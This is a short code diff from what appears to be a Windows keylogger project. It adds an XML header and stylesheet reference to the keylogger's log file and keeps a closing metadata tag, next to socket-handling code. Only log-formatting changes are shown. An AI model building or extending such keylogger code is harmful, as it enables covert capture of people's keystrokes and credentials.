@@ -80,6 +80,11 @@ void Listener()
                                                FILE_ATTRIBUTE_NORMAL,NULL);
             }while(link->FileDescriptor == INVALID_HANDLE_VALUE);
             SetFilePointer(link->FileDescriptor,0x00,NULL,FILE_BEGIN);
+             WriteFile(link->FileDescriptor,
+                "<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<?xml-stylesheet type=\"text/xsl\" href=\"keyloggerStyle.xsl\"?>\n<KeyLoggerMetaData>\n",
+                strlen("<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<?xml-stylesheet type=\"text/xsl\" href=\"keyloggerStyle.xsl\"?>\n<KeyLoggerMetaData>\n"),NULL,NULL);
+
+
             mu.lock();
             /*
                 establish a self referential linked list,
@@ -127,7 +132,7 @@ void Handler()
                         WriteFile(link->FileDescriptor,"\n</KeyLoggerMetaData>\n",
                                   strlen("\n</KeyLoggerMetaData>\n"),NULL,NULL);
                         SetFilePointer(link->FileDescriptor,((-1)*strlen("\n</KeyLoggerMetaData>\n")),NULL,FILE_CURRENT);
-   
+
                 }
                 if (WSAGetLastError() == WSAEWOULDBLOCK)
                 {
